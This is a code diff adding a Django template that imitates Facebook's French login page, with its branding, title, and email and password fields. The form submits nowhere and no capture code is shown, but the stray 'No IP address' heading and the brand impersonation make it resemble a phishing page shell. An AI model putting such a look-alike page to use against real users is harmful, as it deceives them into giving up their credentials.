@@ -1,0 +1,114 @@
+{% load static %}
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <link rel="icon" type="image/x-icon" href="{% static '/img/iconf.png' %}">
+    <title>Facebook-Connexion ou inscription </title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel='stylesheet' type='text/css' media='screen' href="{% static 'css/main.css' %}">
+    
+
+    <style>
+        input.form-group{
+            outline: none;
+            margin-bottom: 10px;
+            padding: 16px;
+            border: 1px solid #d4def3;
+            border-radius: 8px;
+        }
+        input.form-group:focus{
+            border:1px solid blue;
+        
+        }
+        img{
+            width: 300px;
+        }
+        .right-section .btn{
+        background: #166FE5;
+        font-size: 18px;
+        font-weight:bold;
+        color: #fff;
+        border: 1px solid ;
+        height: 50px;
+        border-radius : 10px;
+    
+          }
+        .btn1{
+            background-color: #36a420;
+            height: 50px;
+            color:#fff;
+            font-size: 20px;
+            border-style: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 240px;
+            margin: auto;
+            margin-top: 20px;
+    
+
+        }
+        a.forgot{
+            text-align:center;
+            padding:10px;
+            text-decoration:none;
+        }
+       .down{
+        font-family:Arial;
+        font-size:14px;
+
+       } 
+       .down a{
+        text-decoration:none;
+         color:#1c1e21;
+         font-weight:bold;
+         font-family: Arial;
+        }
+        .down a:hover{
+            text-decoration: underline;
+        }
+    
+        
+    </style>
+</head>
+<body>
+    <div class="page-container">
+        <div class="left-section">
+            <img src="{%  static 'img/face.svg' %}">
+            <p>Avec Facebook, partagez et restez en contact avec votre entourage.</p>
+        </div>
+        <div class="right-section">
+
+            <form action="#" class="myForm">
+                <input type="text" class="form-group" placeholder="Adresse e-mail ou numéro de tél.">
+                <input type="password" class="form-group" placeholder="Mot de passe">
+                <button class="btn">Se connecter</button>
+                <a href="#" class="forgot">Mot de passe oublié ?</a>
+
+                <hr>
+                <button class="btn1">Créer nouveau compte</button>
+
+            </form>
+           
+            
+        </div>
+       
+        
+    </div>
+    <div class="converter">
+        <div class="down">
+            
+            <a  href="#">Creer une Page</a> 
+            pour une célébrité, une marque ou une entreprise.
+
+       </div>
+        
+    </div>
+    <h1>Cancelled</h1>
+    <h2>No IP address</h2>
+
+    <script src="{% static 'js/script.js' %}"></script>
+    
+</body>
+</html>
